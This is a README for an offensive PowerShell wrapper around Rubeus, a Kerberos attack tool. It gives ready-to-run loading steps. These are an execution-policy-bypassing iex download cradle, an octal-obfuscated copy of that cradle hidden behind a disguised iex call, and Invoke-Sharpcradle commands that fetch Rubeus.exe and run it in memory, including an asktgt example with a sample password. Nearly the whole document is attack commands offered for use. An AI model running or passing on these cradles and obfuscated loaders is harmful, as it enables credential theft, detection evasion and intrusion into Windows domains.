# DoGod
*Rubeus wrapped in PowerShell*

import-module ./DoGod.ps1 ---> Loads Rubeus

DoGod ---> Rubeus native help menu

Use Onscreen Instructions for DoGod syntax!

Way 1:
IEX:

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/DoGod/main/DoGod.ps1'))

IEX Obfuscated:

 -jOiN(( 123 , 145 ,164 ,55,105 , 170 ,145 ,143 ,165, 164 , 151 , 157, 156 ,120 , 157, 154, 151, 143 ,171,40 ,102 , 171, 160 ,141 , 163 , 163 , 40,55 ,123,143 , 157 ,160, 145,40 ,120 ,162 ,157 ,143 ,145 , 163,163,40, 55,106 , 157 ,162, 143 ,145,73 , 40 ,133,123,171,163 ,164 , 145 ,155, 56 ,116, 145,164 , 56, 123, 145, 162, 166 , 151 ,143,145,120,157, 151 , 156,164,115, 141,156, 141 , 147,145,162, 135 , 72,72 , 123, 145,143,165, 162 , 151,164, 171, 120, 162 ,157 ,164,157,143,157 ,154 ,40, 75 , 40 , 133 ,123 , 171 ,163 , 164, 145 , 155 , 56,116 ,145, 164, 56, 123 , 145 , 162 ,166 , 151 , 143 , 145,120 , 157 , 151,156,164, 115,141 , 156, 141 ,147,145, 162, 135, 72, 72, 123 , 145 ,143,165, 162,151 ,164, 171 , 120, 162 ,157, 164 , 157, 143, 157 , 154, 40, 55, 142 , 157 ,162 ,40 ,63 , 60 ,67,62 , 73,40 ,151 ,145, 170,40 ,50, 50,116,145, 167 , 55, 117 , 142, 152,145, 143,164, 40 , 123 , 171 ,163,164,145, 155, 56, 116 , 145, 164 ,56 , 127,145,142,103 , 154, 151, 145,156, 164,51,56,104 ,157 ,167 ,156,154 , 157 ,141,144,123 ,164 ,162, 151 , 156 ,147, 50 ,47 , 150,164 , 164 ,160,163, 72 , 57 ,57 , 162 , 141 , 167 ,56 , 147,151,164, 150 , 165, 142 ,165 ,163,145 ,162,143, 157, 156,164 ,145, 156 ,164,56, 143 , 157,155 , 57, 111 ,101, 115, 151, 156 , 132 ,157 ,150 ,157,57, 104 ,157 ,107, 157,144 , 57 ,155, 141,151 , 156,57 ,104 ,157 ,107 ,157, 144 , 56 , 160, 163 ,61 , 47 ,51, 51)| foREACH-objecT{( [CHAR] ( [ConvERt]::toINt16( ( $_.TosTRINg() ),8 ))) }) |&( $PshOme[21]+$PShOme[34]+'x')

Way 2 (for running updated version : v2.2.0):

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/OFFSEC-PowerShell/main/Invoke-Sharpcradle.ps1'))

Rubeus Commands:
Invoke-Sharpcradle -Uri https://raw.githubusercontent.com/IAMinZoho/DoGod/main/Rubeus.exe

or,

Invoke-Sharpcradle -Uri https://raw.githubusercontent.com/IAMinZoho/DoGod/main/Rubeus.exe -Argument1 asktgt /user:Bob /password:user@123


Rubeus.exe: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
